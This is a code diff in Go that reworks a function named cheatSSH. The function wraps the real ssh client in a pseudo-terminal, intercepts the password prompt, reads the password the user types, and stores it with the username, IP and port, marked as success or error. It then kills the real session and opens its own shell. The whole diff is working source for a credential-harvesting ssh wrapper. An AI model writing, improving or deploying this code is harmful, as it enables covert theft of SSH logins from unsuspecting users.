@@ -18,14 +18,13 @@ var SSHAsk = regexp.MustCompile(`(assword.*:)|(attempts)|(密码.*:)|(重试)|(�
 var SSHAskEnd = regexp.MustCompile(`(: $)|(：$)`)
 var SSHSuccess = regexp.MustCompile(`(Welcome to)|(Last login)|(Last failed login)`)
 var SSHIfFirst = regexp.MustCompile(`^(The authenticity)`)
+var SSHFirngerprintPrefix = regexp.MustCompile(`Are you sure`)
+var SSHFirngerprintSuffix = regexp.MustCompile(`\?`)
 
 func cheatSSH() {
 	var pty, err = term.OpenPTY()
 	ExecIfErr(err)
 	var user, password, ip, port string
-	var writeMsg = make(chan struct{})
-	var readLock = make(chan struct{})
-	var AskPass bool
 	c := exec.Command("ssh", os.Args[1:]...)
 	c.Stdout = pty.Slave
 	c.Stdin = pty.Slave
@@ -35,95 +34,77 @@ func cheatSSH() {
 		Setctty: true}
 	c.Start()
 
-	go func() {
-		for {
-			<-writeMsg
-			password = GetPassword()
-			pty.Master.WriteString(password + "\r\n")
-		}
+	var p ptyReader
+	p.Reader(pty)
+	p.AddRule(SSHAsk, SSHAskEnd)
+	p.AddRule(SSHFirngerprintPrefix, SSHFirngerprintSuffix)
 
-	}()
-	var lineByte []byte
-	var line string
-	var FirstTime bool
+	var First bool
+	var AskPass bool
 	go func() {
+		defer func() {
+			p.ReadLock <- struct{}{}
+		}()
+		line := p.Readline()
+		if strings.TrimSpace(line) == "" {
+			line = p.Readline()
+		}
+		if SSHIfFirst.MatchString(line) {
+			First = true
+			fmt.Print(line)
+			for {
+				line = p.Readline()
+				fmt.Print(line)
+				if SSHFirngerprintSuffix.MatchString(line) {
+					var input string
+					fmt.Scanln(&input)
+					if !strings.Contains(strings.ToLower(input), "n") {
+						pty.Master.WriteString("yes\r")
+					} else {
+						os.Exit(1)
+					}
+					p.Readline()
+					p.Readline()
+					line = p.SteamPrint(SSHAsk, SSHAskEnd)
+					break
+				}
+			}
+		}
+		if !failAuthRE.MatchString(line) && !First {
+			return
+		}
+		AskPass = true
+		//fmt.Println(">> yes")
 		for {
-			v, err := pty.ReadByte()
-			if err != nil || v == 0 {
-				readLock <- struct{}{}
+			if p.IsClose() {
+				return
+			}
+			if password != "" && failAuthRE.MatchString(line) {
+				WritePassword(password + " error")
+				password = ""
+			}
+			if strings.TrimSpace(line) != "" && password != "" {
+				user, ip, port = getSSHInfo()
+				prefix := user + " " + ip + " " + port
+				WritePassword(prefix + " " + password + " success")
+				c.Process.Kill()
 				return
 			}
 
-			lineByte = append(lineByte, v)
-			line = string(lineByte)
-			//fmt.Println(line,line[len(line)-1])
-
-			//判断是否需要指纹交互
-			if FirstTime && strings.HasSuffix(line, "?") {
-				var input string
-				fmt.Print(line)
-				fmt.Scanln(&input)
-				pty.Master.WriteString(input + "\r\n")
-				line = ""
-				lineByte = nil
-				FirstTime = false
-				for i := 0; i < len(input+"\r\n"); i++ {
-					pty.ReadByte()
-				}
-				continue
+			fmt.Print(line)
+			if SSHAsk.MatchString(line) && SSHAskEnd.MatchString(line) {
+				password = GetPassword()
+				pty.Master.WriteString(password + "\r")
 			}
-
-			if v == 13 || v == 10 {
-				//根据第一行判断是否为指纹识别模式
-				if SSHIfFirst.MatchString(line) {
-					AskPass = true
-					FirstTime = true
-				}
-				//若不是指纹识别模式和密码模式
-				if !FirstTime && !AskPass && !SSHAsk.MatchString(line) && strings.TrimSpace(line) != "" {
-					readLock <- struct{}{}
-					return
-				}
-				if password != "" && strings.TrimSpace(line) != "" {
-					if user == "" || ip == "" || port == "" {
-						user, ip, port = getSSHInfo()
-					}
-					prefix := user + " " + ip + " " + port
-					if SSHSuccess.MatchString(line) {
-						WritePassword(prefix + " " + password + " success")
-						c.Process.Kill()
-						readLock <- struct{}{}
-						return
-					} else {
-						WritePassword(prefix + " " + password + " error")
-						password = ""
-					}
-				}
-				//AskPass = true
-				fmt.Print(line)
-				lineByte = nil
-				line = ""
-				continue
-			}
-
-			//询问密码语句输出
-			if line != "" && SSHAsk.MatchString(line) && SSHAskEnd.MatchString(line) {
-				AskPass = true
-				fmt.Print(line)
-				lineByte = nil
-				line = ""
-				writeMsg <- struct{}{}
-				//去除输入的换行符
-				//pty.ReadByte()
-			}
+			line = p.Readline()
 		}
+
 	}()
 	c.Wait()
 	if AskPass {
 		time.Sleep(time.Second / 2)
 	}
-	pty.Close()
-	<-readLock
+	p.Close()
 
 	if AskPass && password != "" {
 		startSSHShell(user, password, ip, port)
